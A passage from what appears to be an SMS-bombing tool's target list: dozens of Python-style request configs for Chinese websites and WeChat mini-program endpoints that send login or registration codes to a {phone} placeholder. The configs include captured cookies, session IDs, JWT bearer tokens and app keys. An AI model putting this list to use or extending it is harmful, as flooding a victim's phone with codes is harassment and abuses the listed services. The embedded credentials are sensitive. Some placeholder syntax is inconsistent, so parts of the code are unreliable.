            "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Android WebView\";v=\"138\"",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "sec-ch-ua-mobile": "?1",
            "Origin": "https://support.mikecrm.com",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://support.mikecrm.com/j7ctI52?_cpv=%7B%22208395996%22%3A%22http%3A%2F%2Fcn.mikecrm.com%2FozURs1%22%7D",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
            "Cookie": "uvi=ERwqUZwjB1eLSXL58Ge9IHiTwzh7omkFegjCa77HG0ErxL9BsVLElvLqYLPmgOoz; mk_seed=84; MK_L_UVD=%7B%2223%22%3A%2218070783632%22%2C%2231%22%3A%22%u6551%u8D4E%u7F51%u7EDC%u5B89%u5168%22%2C%2232%22%3A%22%u56FD%u5B89%22%7D; uvis=ERwqUZwjB1eLSXL58Ge9IHiTwzh7omkFegjCa77HG0ErxL9BsVLElvLqYLPmgOoz"
        }
    },
    {
        "name": "mobilev2.atomychina.com.cn",
        "url": "https://mobilev2.atomychina.com.cn/api/user/web/login/login-send-sms-code",
        "method": "POST",
        "json_data": {
            "mobile": "f{phone}",
            "captcha": "1111",
            "token": "1111",
            "prefix": 86
        },
        "headers": {
            "Host": "mobilev2.atomychina.com.cn",
            "Connection": "keep-alive",
            "Content-Length": "68",
            "pragma": "no-cache",
            "design-site-locale": "zh-CN",
            "Accept-Language": "zh-CN",
            "X-HTTP-REQUEST-DOMAIN": "mobilev2.atomychina.com.cn",
            "Content-Type": "application/json",
            "Accept": "application/json",
            "cache-control": "no-cache",
            "xweb_xhr": "1",
            "x-requested-with": "XMLHttpRequest",
            "cookie": "acw_tc=0b6e702e17131629263394156e104b9681bb7f7854d38d5dfc0dff560ade54; guestId=01e7996e-454f-4bab-bd84-44b6d2277113; 15 Apr 2025 06:35:26 GMT; guestId.sig=jWFSrGBOhFwEfFZJbEoMSYkDoO8; 15 Apr 2025 06:35:50 GMT; 15 Apr 2025 06:35:52 GMT",
            "Sec-Fetch-Site": "cross-site",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://servicewechat.com/wx74d705d9fabf5b77/97/page-frame.html",
            "Accept-Encoding": "gzip, deflate, br"
        }
    },
    {
        "name": "apibus.zhihuiyunxing.com",
        "url": "https://apibus.zhihuiyunxing.com/api/1.0/mini/sms",
        "method": "POST",
        "data": {
            "phone": "f{phone}",
            "random": "31540959202205610",
            "userType": "1",
            "type": "PASSENGER_LOGIN_CODE"
        },
        "headers": {
            "Host": "apibus.zhihuiyunxing.com",
            "Connection": "keep-alive",
            "Content-Length": "79",
            "version": "V2.0.0",
            "xweb_xhr": "1",
            "token": "",
            "appKey": "yuis7s5s4d89g0fj1uy9ssksd0fg0",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "*/*",
            "Sec-Fetch-Site": "cross-site",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://servicewechat.com/wx17132144b45008cb/16/page-frame.html",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "zh-CN,zh;q=0.9"
        }
    },
    {
        "name": "yczj.api.autohome.com.cn",
        "url": "https://yczj.api.autohome.com.cn/cus/v1_0_0/api/msite/login/sendVerificationCode",
        "method": "POST",
        "json_data": {
            "mobile": "f{phone}",
            "isDianPing": True,
            "platform": 4,
            "version": "2.2.30",
            "_timestamp": 1736575616,
            "channel": "channel",
            "refPage": "wx_dp",
            "autohomeua": "Windows 10 x64\tcarcomment_windows\t2.7.3\twindows_wx",
            "userid": "",
            "usertoken": "",
            "deviceid": "5db10dd4-e164-4f90-862d-039b22072eef",
            "openid": "o9gLH5SurbWzJacXh2TveA31kUK0",
            "pcpopclub": "",
            "autoUserId": ""
        },
        "headers": {
            "Host": "yczj.api.autohome.com.cn",
            "Connection": "keep-alive",
            "Content-Length": "353",
            "DP_OPEN_ID": "o9gLH5SurbWzJacXh2TveA31kUK0",
            "DP_DEVICE_ID": "5db10dd4-e164-4f90-862d-039b22072eef",
            "WzReview": "app_key=carcomment_android;is_wx=1;userid=0;usertoken=0;dpwxversion=2.2.30;is_rn=1;app_ver=2.7.2;isH5=1;",
            "Content-Type": "application/json",
            "REQ_SOURCE": "wechat_review",
            "Accept": "application/json",
            "xweb_xhr": "1",
            "Cookie": "yczj_login_data=",
            "Sec-Fetch-Site": "cross-site",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://servicewechat.com/wxd32646bc23c54d30/72/page-frame.html",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "zh-CN,zh;q=0.9"
        }
    },
    {
        "name": "gateway-front-external.nio.com",
        "url": "https://gateway-front-external.nio.com/onvo/moat/1100023/n/a/user/access/verification_code",
        "method": "POST",
        "params": {
            "hash_type": "sha256"
        },
        "data": {
            "country_code": "86",
            "mobile": "f{phone}",
            "classifier": "login",
            "device_id": "oPgfE62SRLyPt-MLYg8zJyupZ7ng",
            "terminal": "{\"name\":\"微信小程式-windows\",\"model\":\"microsoft\"}",
            "wechat_app_id": "wxeb0948c3bc004f93"
        },
        "headers": {
            "Host": "gateway-front-external.nio.com",
            "Connection": "keep-alive",
            "Content-Length": "243",
            "xweb_xhr": "1",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "*/*",
            "Sec-Fetch-Site": "cross-site",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://servicewechat.com/wxeb0948c3bc004f93/24/page-frame.html",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "zh-CN,zh;q=0.9"
        }
    },
    {
        "name": "api666.xfb315.cn",
        "url": "https://api666.xfb315.cn/auth/send_sms",
        "method": "POST",
        "json_data": {
            "phone": "f{phone}"
        },
        "headers": {
            "Host": "api666.xfb315.cn",
            "Connection": "keep-alive",
            "Content-Length": "23",
            "version": "10.0.3",
            "xweb_xhr": "1",
            "source": "miniprogram",
            "Authorization": "bearer",
            "Content-Type": "application/json",
            "Accept": "*/*",
            "Sec-Fetch-Site": "cross-site",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://servicewechat.com/wx899e26f0d5e313c0/219/page-frame.html",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "zh-CN,zh;q=0.9"
        }
    },
    {
        "name": "muguntools.com",
        "url": "https://muguntools.com/api/sms/send",
        "method": "POST",
        "json_data": {
            "mobile": "f{phone}",
            "code": "",
            "openid": "oWikI7Tys7eVJJCZ9DbkkE-hjxfE",
            "unionid": "opYUb6lUjDJFbI_K3QtJxkpk2ntE",
            "provider": "weixin"
        },
        "headers": {
            "Host": "muguntools.com",
            "Connection": "keep-alive",
            "Content-Length": "135",
            "version": "1.1.2",
            "Content-Type": "application/json",
            "xweb_xhr": "1",
            "device": "windows",
            "openid": "oWikI7Tys7eVJJCZ9DbkkE-hjxfE",
            "brand": "microsoft",
            "platform": "wxMiniProgram",
            "os": "windows",
            "vcode": "112",
            "modal": "microsoft",
            "unionid": "opYUb6lUjDJFbI_K3QtJxkpk2ntE",
            "Accept": "*/*",
            "Sec-Fetch-Site": "cross-site",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://servicewechat.com/wx38127f9d5d6639cf/15/page-frame.html",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "zh-CN,zh;q=0.9"
        }
    },
    {
        "name": "passport.uucin.com",
        "url": "https://passport.uucin.com/accounts/send_login_mobile_captcha",
        "method": "POST",
        "data": "mobile=f{phone}",
        "headers": {
            "Host": "passport.uucin.com",
            "Connection": "keep-alive",
            "Content-Length": "18",
            "Accept": "application/JSON",
            "xweb_xhr": "1",
            "X-CLIENT-ID": "Yjg2NWE1YTI3M2YyNDlhZjg1NjkzYmIyMGUxYTcwN2I=",
            "Authorization": "token undefined",
            "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
            "Sec-Fetch-Site": "cross-site",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://servicewechat.com/wxb3b23f913746f653/180/page-frame.html",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "zh-CN,zh;q=0.9"
        }
    },
    {
        "name": "www.sohochinaoffice.com",
        "url": "https://www.sohochinaoffice.com/api/mini-login/send-verify-code",
        "method": "POST",
        "json_data": {
            "mobile": "f{phone}"
        },
        "headers": {
            "Host": "www.sohochinaoffice.com",
            "Connection": "keep-alive",
            "Accept": "application/json, text/plain, */*",
            "xweb_xhr": "1",
            "X-Requested-With": "XMLHttpRequest",
            "Cookie": "acw_tc=b65cfd3b17365814882984990e5597abfcb6a4670a24c6837e4ae0424fc03a; SERVERID=cd790e86ab36d7aeaa540056",
            "shumeidid": "",
            "timestamp": 1718182266805,
            "sign": "EFF2468A92FAF3112A3FD75095EF1F86"
        }
    },
    {
        "name": "api.miaozo.com",
        "url": "https://api.miaozo.com/app/sms/v2/login",
        "method": "POST",
        "json_data": {
            "cellphone": "f{phone}",
            "client": {
                "timestamp": 1718183588,
                "identity": "ec66fd8d-105d-4dab-936d-eee301ce25ad",
                "sign": "5025d5b62cc7857f3ee6b66d679f405c"
            }
        },
        "headers": {
            "Host": "api.miaozo.com",
            "Connection": "keep-alive",
            "Content-Length": "153",
            "ApplicationVersion": "6.4.4",
            "PhoneModel": "iPhone 11<iPhone12,1>,iOS 14.7",
            "content-type": "application/json",
            "WechatVersion": "8.0.48,3.3.5",
            "ApplicationSource": "miniPrograme",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wx983bc7fc0880eb68/278/page-frame.html"
        }
    },
    {
        "name": "api.saicmobility.com",
        "url": "https://api.saicmobility.com/cas/v2/mobile/sendmobileauthcode",
        "method": "POST",
        "json_data": {
            "mobile": "f{phone}",
            "userType": 1,
            "templateCode": "0002",
            "smsType": 0,
            "source": "wxmp"
        },
        "headers": {
            "Host": "api.saicmobility.com",
            "Connection": "keep-alive",
            "Content-Length": "87",
            "content-type": "application/json",
            "X-Saic-Platform": "wxmp",
            "X-Saic-LoginChannel": "3",
            "X-Saic-Device-Id": "2ececf17a81bf13923fd7c9273656d15",
            "X-Saic-CityCode": "310100",
            "uid": "",
            "X-MerchantId": "saic_car",
            "X-Saic-ProductId": "1",
            "X-Saic-AppId": "saic_car",
            "X-Saic-App-Version": "3.0.0",
            "X-Saic-CurrentTimeZone": "UTC+8",
            "X-Saic-Real-App-Version": "4.11",
            "X-Saic-Finger": "e6c1108a-5a27-4ae0-8ab6-d97588dc0f7e",
            "X-Saic-Req-Ts": "1718184226305",
            "X-Saic-Channel": "saicwx",
            "X-Saic-Gps": "140.33470745899146,37.491017710754086",
            "X-Saic-Location-CityCode": "310100",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wx3207ea5333ed52dc/139/page-frame.html"
        }
    },
    {
        "name": "www.hylyljk.com",
        "url": "https://www.hylyljk.com/ymm-common/sms/sendSmsCode",
        "method": "POST",
        "json_data": {
            "phone": "f{phone}"
        },
        "headers": {
            "Content-Type": "application/json",
            "UserType": "1",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wx7edcedb080ff0cf0/84/page-frame.html"
        }
    },
    {
        "name": "u.letfungo.com",
        "url": "https://u.letfungo.com/api/app/user/ebikeUsers/registerSendSMS",
        "method": "POST",
        "data": {
            "type": "1002",
            "act": "send",
            "phone": "f{phone}",
            "page_code": "aHpsZnwxNzE4Mzg5MzMwaHpsZjIwMTgO0O0O",
            "plat_id": "1",
            "token": "116231749b8325e998dc2e9c4dc8605a157c537f70dfe008df0e10458ebfcd6db881949c4f9772c37c25731ab667f804"
        },
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "op-lang": "zh-Hans",
            "app-phone-version": "iOS 14.7",
            "app-phone-style": "iPhone 11<iPhone12,1>",
            "platform": "ios",
            "uuid": "17183893235984919229",
            "app-lang": "",
            "aid": "",
            "mp-version": "8.0.48",
            "appid": "wx29861b332f0eb297",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wx29861b332f0eb297/256/page-frame.html"
        }
    },
    {
        "name": "ddc.jiahengchuxing.com",
        "url": "https://ddc.jiahengchuxing.com/account/account/sendRegisterCode",
        "method": "POST",
        "params": {
            "fromApi": "miniapp"
        },
        "data": {
            "mobile": "f{phone}"
        },
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "token": "",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wx997eeb950b7e0cfc/66/page-frame.html"
        }
    },
    {
        "name": "esino.xtrunc.com",
        "url": "https://esino.xtrunc.com/esino/api/user/phone_auth",
        "method": "POST",
        "params": {
            "3rd": "0000*0000",
            "tm": "1718386573"
        },
        "json_data": {
            "3rdsession": "0000000000000000",
            "op": "sendsms",
            "phonenumber": "f{phone}",
            "code": "0e3Tpi0w3KJFX23HfI2w3jF25V3Tpi0N",
            "appid": "wxffcf13a198304d5b",
            "ver": "v2"
        },
        "headers": {
            "Content-Type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wxffcf13a198304d5b/2/page-frame.html"
        }
    },
    {
        "name": "ride-platform.hellobike.com",
        "url": "https://ride-platform.hellobike.com/api",
        "method": "POST",
        "json_data": {
            "riskControlData": {},
            "version": "6.57.0",
            "releaseVersion": "6.57.0",
            "systemCode": "226",
            "appName": "AppHelloMiniBrand",
            "mobileModel": "iPhone 11<iPhone12,1>",
            "weChatVersion": "8.0.48",
            "mobileSystem": "iOS 14.7",
            "SDKVersion": "3.3.5",
            "systemPlatform": "ios",
            "from": "wechat",
            "CODE_ENV": "pro",
            "mobile": "f{phone}",
            "tenantId": "t_chn_ascx",
            "source": "0",
            "action": "saas.user.auth.sendCode"
        },
        "headers": {
            "Content-Type": "application/json",
            "nonce": "883727",
            "signature": "5ad8f3f0754caa92e62af53a1b55acabab3d0cac",
            "timestamp": "1718387466307",
            "systemCode": "226",
            "x-chaos-env": "pro-1.1.2",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wx28d825793977e385/16/page-frame.html"
        }
    },
    {
        "name": "api.xiaoantech.com",
        "url": "https://api.xiaoantech.com/xcuser/v1/user/requestSmsCode",
        "method": "POST",
        "json_data": {
            "mobilePhoneNumber": "f{phone}"
        },
        "headers": {
            "accept": "application/json",
            "content-type": "application/json",
            "X-LC-Id": "6037536b17162e00016bcf6c",
            "X-LC-Session": "",
            "X-LC-Key": "LTAI4GLABNn7ngjVekkgx5m2",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wxd1fd30eba3f80057/11/page-frame.html"
        }
    },
    {
        "name": "axq.beidouxh.cn",
        "url": "https://axq.beidouxh.cn/user-api/getPhoneCode",
        "method": "POST",
        "json_data": {
            "phone": "f{phone}",
            "eventType": 12,
            "ver": "1.0.0",
            "plat": "weixin",
            "sys": "iphone",
            "imei": "123456789",
            "timestamp": 1718388614,
            "sign": "123456789abcd"
        },
        "headers": {
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wx16326cd757042bb1/89/page-frame.html"
        }
    },
    {
        "name": "www.8341.top",
        "url": "https://www.8341.top/sys/tabUser/sms",
        "method": "POST",
        "json_data": {
            "phone": "f{phone}"
        },
        "headers": {
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wx0e75b2cce830f980/37/page-frame.html"
        }
    },
    {
        "name": "zcclient.uqbike.com",
        "url": "https://zcclient.uqbike.com/customer/login/sms",
        "method": "POST",
        "json_data": {
            "phone": "f{phone}",
            "appId": "wx889c3c5d7bc8dc51",
            "wxLoginCode": "0c3uRo000ZiAiS1eLd300SX4Bo4uRo0N",
            "loginType": 1
        },
        "headers": {
            "token": "",
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wx889c3c5d7bc8dc51/14/page-frame.html"
        }
    },
    {
        "name": "hdg.u-ebike.com",
        "url": "https://hdg.u-ebike.com:19082/user/system/checkUsername",
        "method": "POST",
        "json_data": {
            "username": "f{phone}"
        },
        "headers": {
            "content-type": "application/json",
            "X-Authorization": "",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wx206637e1780ccd3c/21/page-frame.html"
        }
    },
    {
        "name": "dy.qiyiqixing.com",
        "url": "https://dy.qiyiqixing.com/mini-member-api/blade-resource/sms/endpoint/send-validate",
        "method": "POST",
        "json_data": {
            "phone": "f{phone}",
            "type": 1
        },
        "headers": {
            "Content-Type": "application/json",
            "Blade-Auth": "",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wxc8e98aadbeac1abe/68/page-frame.html"
        }
    },
{
"name": "m.zhongmin.cn",
"url": "https://m.zhongmin.cn/GetVerifyPass/getRandCode",
"method": "POST",
"data": 'mobilephone=f"{phone}"&smsType=register&NcoSig=&orderId=', 
"headers": {
"Host": "m.zhongmin.cn",
"Connection": "keep-alive",
"Accept": "text/plain, /; q=0.01",
"_RequestNcoSig": "",
"X-Requested-With": "XMLHttpRequest",
"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
"Origin": "https://m.zhongmin.cn",
"Sec-Fetch-Site": "same-origin",
"Sec-Fetch-Mode": "cors",
"Sec-Fetch-Dest": "empty",
"Referer": "https://m.zhongmin.cn/benefitGuarantee/Index?&miniprogram=1&isarticle=0&miniphone=&cityid=&openid=o-GO4nJ_a__pb7GdQZbYng9SZK4&areaCode=",
"Accept-Encoding": "gzip, deflate",
"Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
},
"cookies": {
"cookieUserName": "cookieC3442470117C640BBB6F8858A66BE4BF",
"areaCodeOut": "Code%3D",
"Hm_lvt_6c7f533b7cc67b6f40de81580fec468e": "1767420238",
"Hm_lpvt_6c7f533b7cc67b6f40de81580fec468e": "1767420238",
"HMACCOUNT": "D0094CD5A243E51C"
}
},
{
"name": "apis-v3.shukeapp.net",
"url": "https://apis-v3.shukeapp.net/sms/verification_code/send",
"method": "POST",
"json_data": {
"phone": f"{phone}",
"type": "login"
},
"headers": {
"Host": "apis-v3.shukeapp.net",
"Connection": "keep-alive",
"Accept": "application/json, text/plain, /",
"content-type": "application/json",
"isSetToken": "[object Boolean]",
"app-source": "applet-weixin",
"app-version": "1.0.0-dev",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wxdd98e97d4233772d/41/page-frame.html",
"Accept-Encoding": "gzip, deflate, br"
}
},
{
"name": "app.fxxszx.com",
"url": "https://app.fxxszx.com/Mobile/Mmember/sendsms",
"method": "GET",
"params": {
"mobile": f"{phone}",
"type": "2"
},
"headers": {
"Host": "app.fxxszx.com",
"Connection": "keep-alive",
"content-type": "application/json",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wxdb979719c20104ed/49/page-frame.html",
"Accept-Encoding": "gzip, deflate, br"
}
},
{
"name": "apis.xydtec.cn",
"url": "https://apis.xydtec.cn/zeus/titan-customer/auth/account/sendSms",
"method": "POST",
"json_data": {
"scene": "captcha_login",
"phone": f"{phone}",
"source": "miniProgram"
},
"headers": {
"Host": "apis.xydtec.cn",
"Connection": "keep-alive",
"Accept": "application/json, text/plain, /",
"content-type": "application/json;charset=utf-8",
"token": "",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wx1fa8d160de176d6a/7/page-frame.html",
"Accept-Encoding": "gzip, deflate, br"
}
},
{
"name": "flexiblet.jingshunkeji.cn",
"url": "https://flexiblet.jingshunkeji.cn/crowdapi/oddjobmp/acc/sendRegCode",
"method": "POST",
"json_data": {
"phone": f"{phone}"
},
"headers": {
"Host": "flexiblet.jingshunkeji.cn",
"Connection": "keep-alive",
"content-type": "application/json",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wx8f7b2bd65e648b59/3/page-frame.html",
"Accept-Encoding": "gzip, deflate, br"
}
},
{
"name": "api.hichefu.com",
"url": "https://api.hichefu.com/client-openapi/driver/user/secret/getVerifyNum",
"method": "GET",
"params": {
"phone": f"{phone}"
},
"headers": {
"Host": "api.hichefu.com",
"Connection": "keep-alive",
"content-type": "application/x-www-form-urlencoded",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wxfcefd15db3f128ab/28/page-frame.html",
"Accept-Encoding": "gzip, deflate, br"
}
},
{
"name": "weix.generali-china.cn",
"url": "https://weix.generali-china.cn/mapis/zuul-wd/login/getRandom",
"method": "POST",
"data": f"mobilePhone={phone}",
"headers": {
"Host": "weix.generali-china.cn",
"Connection": "keep-alive",
"content-type": "application/x-www-form-urlencoded",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wx1e848cefaf03ede7/115/page-frame.html",
"Accept-Encoding": "gzip, deflate, br"
}
},
{
"name": "super.wakerschool.top",
"url": "https://super.wakerschool.top/auth/api/login/verify-code",
"method": "POST",
"json_data": {
"type": 4,
"phone": f"{phone}"
},
"headers": {
"Host": "super.wakerschool.top",
"Connection": "keep-alive",
"content-type": "application/json;charset=utf-8",
"clientplatform": "xapp",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wx73c2fde47ea90af7/197/page-frame.html",
"Accept-Encoding": "gzip, deflate, br"
}
},
{
"name": "super.wakerschool.top",
"url": "https://super.wakerschool.top/auth/api/verify-code",
"method": "POST",
"json_data": {
"type": 9,
"phone": f"{phone}"
},
"headers": {
"Host": "super.wakerschool.top",
"Connection": "keep-alive",
"content-type": "application/json;charset=utf-8",
"Authorization": "eyJhbGciOiJIUzUxMiJ9.eyJtaW5pX3VzZXJfa2V5IjoiNjg1NmIwZWMtNjBiMy00YzExLWFhZmItODhiNzUxYWFlMzdkIiwibWluaV91c2VyX2xvZ2luX3RpbWU6IjoiMTc2NzUzNDk5NjQyOSIsIm1pbmlfdXNlcl9yb2xlIjoxLCJtaW5pX3VzZXJfbW9iaWxlIjoiMTc3NDYzNzcxMzUiLCJtaW5pX3VzZXJfbmFtZSI6IuaDn-WuoueUqOaItzcxMzAiLCJtaW5pX2FjY291bnRfaWQiOjE5OTM1MjY1MjY3MjMxMzc1MzZ9.Tah174sEU-0sZ5Oj2bn06VObZ3HNG3MXmi4MkX5fBmSw2-vPPZn833KvNSCEOXatKzFyveK1--tBePcW3gfWcw",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wx73c2fde47ea90af7/197/page-frame.html",
"Accept-Encoding": "gzip, deflate, br"
}
},
{
"name": "super.wakerschool.top",
"url": "https://super.wakerschool.top/auth/api/verify-code",
"method": "POST",
"json_data": {
"type": 1,
"phone": f"{phone}"
},
"headers": {
"Host": "super.wakerschool.top",
"Connection": "keep-alive",
"content-type": "application/json;charset=utf-8",
"clientplatform": "xapp",
"Authorization": "eyJhbGciOiJIUzUxMiJ9.eyJtaW5pX3VzZXJfa2V5IjoiNjg1NmIwZWMtNjBiMy00YzExLWFhZmItODhiNzUxYWFlMzdkIiwibWluaV91c2VyX2xvZ2luX3RpbWU6IjoiMTc2NzUzNDk5NjQyOSIsIm1pbmlfdXNlcl9yb2xlIjoxLCJtaW5pX3VzZXJfbW9iaWxlIjoiMTc3NDYzNzcxMzUiLCJtaW5pX3VzZXJfbmFtZSI6IuaDn-WuoueUqOaItzcxMzAiLCJtaW5pX2FjY291bnRfaWQiOjE5OTM1MjY1MjY3MjMxMzc1MzZ9.Tah174sEU-0sZ5Oj2bn06VObZ3HNG3MXmi4MkX5fBmSw2-vPPZn833KvNSCEOXatKzFyveK1--tBePcW3gfWcw",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wx73c2fde47ea90af7/197/page-frame.html",
"Accept-Encoding": "gzip, deflate, br"
}
},
{
"name": "fwapi.lixiangsys.com",
"url": "https://fwapi.lixiangsys.com/v1/sms/unauth_codes",
"method": "POST",
"json_data": {
"mobile": f"{phone}"
},
"headers": {
"Host": "fwapi.lixiangsys.com",
"Connection": "keep-alive",
"Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhcm4iOiIyIiwiZXhwIjoxNzY3NTc5MzMzLCJwbGF0Zm9ybV9pZCI6IjUzIiwidXNlcl9pZCI6IiIsInVzZXJfbmFtZSI6IiIsInd4X2FwcGlkIjoid3gwMWY5NTM4MWViZjY4NzBjIiwid3hfb3BlbmlkIjoib0pHZGYxOTR6LTdTWElLN0FROVB1QlVSQTNZbyJ9.Qeg4lVC63DOtH5rO2IAoARkR773WtPIkUop_Hy4n_VY",
"content-type": "application/json",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wx01f95381ebf6870c/2/page-frame.html",
"Accept-Encoding": "gzip, deflate, br"
}
},
{
"name": "hr.gzh-vip.com",
"url": "https://hr.gzh-vip.com/wlhyapi/api/SmsMsgService/sendVerifyCodePlatform",
"method": "POST",
"data": f"mobile={phone}&templateCode=hrsaas_first_set_password&productKey=weapp-zbrl&custKey=&session3rd=e9538963-2d92-4d56-abde-eb2b336ee384",
"headers": {
"Host": "hr.gzh-vip.com",
"Connection": "keep-alive",
"content-type": "application/x-www-form-urlencoded",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wx48df0a0ab8f69946/13/page-frame.html",
"Accept-Encoding": "gzip, deflate, br"
},
"cookies": {
"SHAREJSESSIONID": "ss-e581f0be-e5b0-4579-ba1d-97ecd116b724"
}
},
{
"name": "hr.gzh-vip.com",
"url": "https://hr.gzh-vip.com/wlhyapi/api/HrSalaryBillService/sendNoCardWithdrawCode",
"method": "POST",
"data": f"mobile={phone}&type=LABORER_WITHDRAWAL_VERIFY&productKey=weapp-zbrl&custKey=&session3rd=e9538963-2d92-4d56-abde-eb2b336ee384",
"headers": {
"Host": "hr.gzh-vip.com",
"Connection": "keep-alive",
"content-type": "application/x-www-form-urlencoded",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wx48df0a0ab8f69946/13/page-frame.html",
"Accept-Encoding": "gzip, deflate, br"
},
"cookies": {
"SHAREJSESSIONID": "ss-e581f0be-e5b0-4579-ba1d-97ecd116b724"
}
},
{
"name": "tapi.99make.com",
"url": "https://tapi.99make.com/make_rider/v1/send_provider_sms",
"method": "POST",
"data": f"mobile={phone}&type=rider_login&code=&captcha_key=&uniacid=19&mk_version=2.1.2",
"headers": {
"Host": "tapi.99make.com",
"Connection": "keep-alive",
"contentType": "application/json",
"Accept": "application/json",
"content-type": "application/x-www-form-urlencoded",
"Authorization": "",
"MkTimestamp": "1767539066",
"MkVersion": "2.1.2",
"MkNoncestr": "SotoUqyhbq",
"MkSiganture": "a1f8568cc8e992f574ef0e81b6e17dd7",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wxdebb0d021f6fe3f3/90/page-frame.html",
"Accept-Encoding": "gzip, deflate, br"
}
},
{
"name": "zb.hoomi.cn",
"url": "https://zb.hoomi.cn/delivery/permissions/v1/send-phone-verification-code",
"method": "POST",
"data": {
"phone": f"{phone}"
},
"headers": {
"authorization": "",
"x-ca-stage": "RELEASE",
"charset": "utf-8",
"referer": "https://servicewechat.com/wx5552cc25386b9b74/82/page-frame.html"
}
},
{
"name": "api.databnu.com",
"url": "https://api.databnu.com/response/Member/sendPhoneSms",
"method": "POST",
"json_data": {
"phone": f"{phone}",
"openid": "小玮"
},
"headers": {
"Content-Type": "application/json",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wx626c02ffbd64fb6a/7/page-frame.html"
}
},
{
"name": "app.maizizhongbao.com",
"url": "https://app.maizizhongbao.com/api/getPhoneCode",
"method": "POST",
"json_data": {
"userName": f"{phone}"
},
"headers": {
"Content-Type": "application/json",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wxf7b0e242d5a3c7ff/50/page-frame.html",
"Cookie": "sctysoft_api2=s%3ATynPkZHOyaA_8F_PJhcWliJCpp2xR9Fe.jYHafj%2BbfmWGy9CrL1mzw6ktrCisdQsF6tox%2Bui4hc4"
}
},
{
"name": "app.maizizhongbao.com",
"url": "https://app.maizizhongbao.com/api/getPhoneCode",
"method": "POST",
"json_data": {
"userName": f"{phone}"
},
"headers": {
"Content-Type": "application/json",
"Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiMTc3NDYzNzcxMzUiLCJuaWNoZW5nIjoiODk1MjQ2IiwiaWF0IjoxNzY3NTQwMTExfQ.e5yQHT6mzQN4Ii4GwDjUreSFyK_rgE4Co7L306GyySI",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wxf7b0e242d5a3c7ff/50/page-frame.html",
"Cookie": "sctysoft_api2=s%3AYvZapTBWAh9_PN87qae16sinWi6_p3EP.bEz47TPLzKGhX7WwmFiATuHIZwphRS0j5q3GVUQhphI"
}
},
{
"name": "api.yunyonggongl.com",
"url": "https://api.yunyonggongl.com/lgy-auth/auth/worker/send-code",
"method": "POST",
"json_data": {
"mobile": f"{phone}",
"codeType": "REGISTER",
"isNot": "R"
},
"headers": {
"Content-Type": "application/json",
"content-type": "application/json;charset=UTF-8",
"charset": "utf-8",
"Referer": "https://servicewechat.com/wxa0977eddbeda8745/24/page-frame.html"
}
},
{
"name": "applets.trumpet.netease.com",
